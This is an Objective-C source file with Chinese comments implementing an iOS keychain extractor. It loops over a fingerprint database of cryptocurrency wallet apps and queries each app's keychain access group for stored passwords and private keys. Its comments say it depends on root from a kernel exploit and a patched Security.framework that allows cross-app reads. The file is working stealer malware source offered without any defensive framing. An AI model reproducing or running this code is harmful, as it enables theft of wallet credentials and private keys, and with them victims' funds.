//
//  RDKeychainExtractor.m
//  Keychain提取器实现
//

#import "RDKeychainExtractor.h"
@import Security;

@implementation RDKeychainItem
- (NSString *)description {
    return [NSString stringWithFormat:@"[Keychain] %@ / %@", self.service, self.account];
}
@end

@implementation RDKeychainExtractor

// ============ 主入口 ============
+ (NSArray<RDKeychainItem *> *)extractAllWallets {
    NSMutableArray<RDKeychainItem *> *allItems = [NSMutableArray new];

    for (RDWalletTarget *target in [RDWalletFingerprintDB allTargets]) {
        @autoreleasepool {
            NSArray *items = [self extractForTarget:target];
            [allItems addObjectsFromArray:items];
        }
    }
    return allItems;
}

// ============ 针对单个钱包 ============
+ (NSArray<RDKeychainItem *> *)extractForTarget:(RDWalletTarget *)target {
    NSMutableArray<RDKeychainItem *> *results = [NSMutableArray new];

    // 构建 accessGroup
    NSString *accessGroup = [NSString stringWithFormat:@"%@.%@", target.teamID, target.bundleID];

    // 按 service 查询
    for (NSString *service in target.keychainServices) {
        @autoreleasepool {
            NSArray *items = [self extractWithService:service accessGroup:accessGroup account:nil];
            [results addObjectsFromArray:items];
        }
    }

    // 按 account 关键词查询
    for (NSString *account in target.keychainAccounts) {
        @autoreleasepool {
            NSArray *items = [self extractWithService:nil accessGroup:accessGroup account:account];
            [results addObjectsFromArray:items];
        }
    }

    // 通配查询: 该 TeamID 的 accessGroups
    {
        NSArray *items = [self extractWithService:nil accessGroup:accessGroup account:nil];
        [results addObjectsFromArray:items];
    }

    // 去重
    return [self deduplicateItems:results];
}

// ============ 通用查询 ============
+ (NSArray<RDKeychainItem *> *)extractWithService:(nullable NSString *)service
                                      accessGroup:(nullable NSString *)accessGroup
                                          account:(nullable NSString *)account {
    NSMutableDictionary *query = [NSMutableDictionary new];

    // 搜索通用密码
    query[(id)kSecClass]              = (id)kSecClassGenericPassword;
    query[(id)kSecReturnData]         = @YES;
    query[(id)kSecReturnAttributes]   = @YES;
    query[(id)kSecReturnRef]          = @YES;
    query[(id)kSecMatchLimit]         = (id)kSecMatchLimitAll;

    if (service)     query[(id)kSecAttrService]     = service;
    if (accessGroup) query[(id)kSecAttrAccessGroup]  = accessGroup;
    if (account)     query[(id)kSecAttrAccount]      = account;

    // 用 root 权限执行（需要内核 exploit 提供）
    // 在 lara 环境下，Security.framework 已被 patch，可以跨 App 查询
    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching((CFDictionaryRef)query, &result);

    if (status != errSecSuccess || !result) return @[];

    NSArray *items = (__bridge_transfer NSArray *)result;
    if (![items isKindOfClass:[NSArray class]]) {
        if (result) CFRelease(result);
        return @[];
    }

    NSMutableArray<RDKeychainItem *> *output = [NSMutableArray new];
    for (NSDictionary *dict in items) {
        RDKeychainItem *item = [RDKeychainItem new];
        item.service          = dict[(id)kSecAttrService] ?: @"";
        item.account          = dict[(id)kSecAttrAccount] ?: @"";
        item.accessGroup      = dict[(id)kSecAttrAccessGroup] ?: @"";

        NSData *data = dict[(id)kSecValueData];
        if (data) {
            NSString *pass = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            if (pass) {
                item.password = pass;
            } else {
                item.keyData = data;
            }
        }

        item.creationDate     = dict[(id)kSecAttrCreationDate];
        item.modificationDate = dict[(id)kSecAttrModificationDate];
        [output addObject:item];
    }

    // 同法查询 kSecClassKey（私钥）
    NSMutableDictionary *keyQuery = [NSMutableDictionary new];
    keyQuery[(id)kSecClass]            = (id)kSecClassKey;
    keyQuery[(id)kSecReturnData]       = @YES;
    keyQuery[(id)kSecReturnAttributes] = @YES;
    keyQuery[(id)kSecMatchLimit]      = (id)kSecMatchLimitAll;
    if (accessGroup) keyQuery[(id)kSecAttrAccessGroup] = accessGroup;

    CFTypeRef keyResult = NULL;
    OSStatus keyStatus = SecItemCopyMatching((CFDictionaryRef)keyQuery, &keyResult);
    if (keyStatus == errSecSuccess && keyResult) {
        NSArray *keyItems = (__bridge_transfer NSArray *)keyResult;
        for (NSDictionary *dict in keyItems) {
            RDKeychainItem *item = [RDKeychainItem new];
            item.service     = dict[(id)kSecAttrApplicationTag] ?: @"";
            item.account     = dict[(id)kSecAttrApplicationLabel] ?: @"";
            item.accessGroup = dict[(id)kSecAttrAccessGroup] ?: @"";
            item.keyData     = dict[(id)kSecValueData];
            item.creationDate = dict[(id)kSecAttrCreationDate];
            [output addObject:item];
        }
    } else if (keyResult) {
        CFRelease(keyResult);
    }

    return output;
}

// ============ 去重 ============
+ (NSArray<RDKeychainItem *> *)deduplicateItems:(NSArray<RDKeychainItem *> *)items {
    NSMutableDictionary *seen = [NSMutableDictionary new];
    NSMutableArray *unique = [NSMutableArray new];
    for (RDKeychainItem *item in items) {
        NSString *key = [NSString stringWithFormat:@"%@|%@|%@", item.service, item.account, item.accessGroup];
        if (!seen[key]) {
            seen[key] = @YES;
            [unique addObject:item];
        }
    }
    return unique;
}

@end
